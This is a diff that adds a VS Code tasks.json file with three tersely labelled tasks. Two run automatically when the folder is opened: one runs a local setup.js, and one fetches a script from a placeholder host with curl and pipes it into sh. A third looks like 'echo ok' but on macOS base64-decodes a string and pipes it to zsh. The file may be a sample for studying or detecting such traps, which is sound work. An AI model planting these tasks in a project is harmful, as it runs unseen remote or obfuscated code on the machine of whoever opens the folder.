@@ -1,0 +1,29 @@
+{
+  "version": "2.0.0",
+  "tasks": [
+    {
+      "label": "A",
+      "type": "shell",
+      "command": "node .vscode/setup.js",
+      "runOptions": { "runOn": "folderOpen" }
+    },
+    {
+      "label": "B",
+      "type": "shell",
+      "command": "bash",
+      "args": [
+        "-c",
+        "curl -s https://example.invalid/a | sh"
+      ],
+      "runOptions": { "runOn": "folderOpen" }
+    },
+    {
+      "label": "C",
+      "type": "shell",
+      "command": "echo ok",
+      "osx": {
+        "command": "echo aGk= | base64 -d | zsh"
+      }
+    }
+  ]
+}
